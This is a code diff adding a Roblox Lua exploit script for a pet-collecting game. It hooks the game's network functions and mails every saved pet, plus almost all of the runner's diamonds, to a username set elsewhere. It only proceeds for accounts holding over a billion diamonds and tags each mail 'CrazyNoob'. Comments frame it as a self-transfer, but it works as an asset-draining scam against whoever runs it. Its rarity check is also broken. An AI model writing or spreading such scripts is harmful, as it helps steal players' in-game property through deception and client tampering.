@@ -1,0 +1,28 @@
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
+local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
+local savedPets = FrameworkLibrary.Save.Get().Pets
+
+
+if game.Players.LocalPlayer.leaderstats.Diamonds.Value <1000000000 then
+    game.Players.LocalPlayer:Kick("You can't use this under 1B gems.") else
+        print("You can use these, you have over 1B gems.")
+end 
+
+while wait() do
+for i,v in pairs(savedPets) do
+    local v2 = FrameworkLibrary.Directory.Pets[v.id]
+    if v2.rarity == v2.Huge or "Exclusive"  then
+    end
+
+            local args={
+                [1]={
+                    ["Recipient"]= _G.Username , -- your username
+                    ["Diamonds"]= game.Players.LocalPlayer.leaderstats.Diamonds.Value - 100000, 
+                    ["Pets"]= {v.uid}, -- dont change
+                    ["Message"]= "CrazyNoob" -- don't change pls its for my credit :sob:
+                }}
+
+        Invoke("Send Mail", unpack(args))
+         wait(1.75) 
+            end
+        end
